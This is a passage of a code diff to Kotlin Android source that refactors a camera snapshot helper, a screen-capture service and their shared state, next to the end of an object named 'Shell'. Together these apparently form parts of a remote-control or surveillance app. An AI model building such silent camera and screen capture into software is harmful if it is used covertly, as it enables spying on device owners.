@@ -320,7 +320,8 @@ object Shell {
     } catch (e: Exception) { "err: ${e.message}" }
 }
 
-object cam{ 
+object Cam {
+
     fun snap(ctx: Context, front: Boolean, cb: (ByteArray?) -> Unit) {
         if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.CAMERA)
             != PackageManager.PERMISSION_GRANTED) { cb(null); return }
@@ -334,15 +335,16 @@ object cam{
             val want = if (front) CameraCharacteristics.LENS_FACING_FRONT
             else CameraCharacteristics.LENS_FACING_BACK
 
-            var id: String? = null
+            var found: String? = null
             for (cid in mgr.cameraIdList) {
                 if (mgr.getCameraCharacteristics(cid).get(CameraCharacteristics.LENS_FACING) == want) {
-                    id = cid
+                    found = cid
                     break
                 }
             }
-            if (id == null) { cb(null); ht.quitSafely(); return }
+            if (found == null) { cb(null); ht.quitSafely(); return }
 
+            val camId: String = found
             val reader = ImageReader.newInstance(1280, 960, ImageFormat.JPEG, 2)
             var done = false
 
@@ -361,14 +363,13 @@ object cam{
                         }
                     } catch (_: Exception) { }
                     cb(arr)
-                    try { mgr.closeCamera(id) } catch (_: Exception) { }
+                    try { mgr.closeCamera(camId) } catch (_: Exception) { }
                     try { r.close() } catch (_: Exception) { }
                     ht.quitSafely()
                 }
             }, h)
 
-
-            mgr.openCamera(id, object : CameraDevice.StateCallback() {
+            mgr.openCamera(camId, object : CameraDevice.StateCallback() {
                 override fun onOpened(d: CameraDevice) {
                     try {
                         val req = d.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
@@ -392,7 +393,7 @@ object cam{
                 if (!done) {
                     done = true
                     cb(null)
-                    try { mgr.closeCamera(id) } catch (_: Exception) { }
+                    try { mgr.closeCamera(camId) } catch (_: Exception) { }
                 }
             }, 6000)
 
@@ -401,6 +402,12 @@ object cam{
             ht.quitSafely()
         }
     }
+}
+
+object Scr {
+    @Volatile var instance: ScreenService? = null
+    @Volatile var code: Int? = null
+    @Volatile var data: Intent? = null
 }
 
 class ScreenCapActivity : Activity() {
@@ -412,8 +419,8 @@ class ScreenCapActivity : Activity() {
 
     override fun onActivityResult(req: Int, res: Int, data: Intent?) {
         if (res == RESULT_OK && data != null) {
-            ScreenService.code = res
-            ScreenService.data = data
+            Scr.code = res
+            Scr.data = data
             try {
                 ContextCompat.startForegroundService(this, Intent(this, ScreenService::class.java))
             } catch (_: Exception) { }
@@ -457,8 +464,8 @@ class ScreenService : Service() {
 
     @Suppress("DEPRECATION")
     private fun setup() {
-        val c = code
-        val d = data
+        val c = Scr.code
+        val d = Scr.data
         if (c == null || d == null) return
         val m = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
         try {
@@ -474,7 +481,7 @@ class ScreenService : Service() {
             reader = ImageReader.newInstance(dm.widthPixels, dm.heightPixels, PixelFormat.RGBA_8888, 2)
             vd = proj?.createVirtualDisplay("scr", dm.widthPixels, dm.heightPixels, dm.densityDpi,
                 DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader?.surface, null, null)
-            instance = this
+            Scr.instance = this
         } catch (_: Exception) { }
     }
 
@@ -504,10 +511,4 @@ class ScreenService : Service() {
         val b = bmp ?: return null
         val out = java.io.ByteArrayOutputStream()
         val w = 720
-        val s = Bitmap.createScaledBitmap(b, w, (b.height * (w.toFloat() / b.width)).toInt(), true)
-        s.compress(Bitmap.CompressFormat.JPEG, 60, out)
-        return out.toByteArray()
-    }
-
-    private fun cleanup() {
-        try { 
+        val s = Bitmap.createScaledBitmap(b, w, (
